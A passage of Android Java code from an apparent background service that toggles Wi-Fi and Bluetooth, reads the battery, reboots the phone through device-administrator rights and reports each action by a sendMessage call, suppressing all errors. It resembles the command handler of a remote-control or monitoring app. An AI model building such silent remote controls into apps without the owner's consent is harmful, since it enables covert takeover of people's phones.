    private void wifiOn() {
        try {
            if (wifiManager != null) {
                wifiManager.setWifiEnabled(true);
                sendMessage("📡 تشغيل الواي فاي");
            }
        } catch (Exception e) {}
    }
    
    private void wifiOff() {
        try {
            if (wifiManager != null) {
                wifiManager.setWifiEnabled(false);
                sendMessage("📡 إيقاف الواي فاي");
            }
        } catch (Exception e) {}
    }
    
    private void bluetoothOn() {
        try {
            if (bluetoothAdapter != null && !bluetoothAdapter.isEnabled()) {
                bluetoothAdapter.enable();
                sendMessage("🔵 تشغيل البلوتوث");
            }
        } catch (Exception e) {}
    }
    
    private void bluetoothOff() {
        try {
            if (bluetoothAdapter != null && bluetoothAdapter.isEnabled()) {
                bluetoothAdapter.disable();
                sendMessage("🔵 إيقاف البلوتوث");
            }
        } catch (Exception e) {}
    }
    
    private void getBattery() {
        try {
            BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
            int battery = 0;
            if (bm != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                battery = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
            sendMessage("🔋 البطارية: " + battery + "%");
        } catch (Exception e) {}
    }
    
    private void reboot() {
        try {
            if (dpm.isAdminActive(adminComponent)) {
                dpm.reboot(adminComponent);
            }
        } catch (Exception e) {}
    }
    
    @Override
    public void onDestroy() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        if (cleanupTimer != null) {
            cleanupTimer.cancel();
        }
        super.onDestroy();
    }
                  }
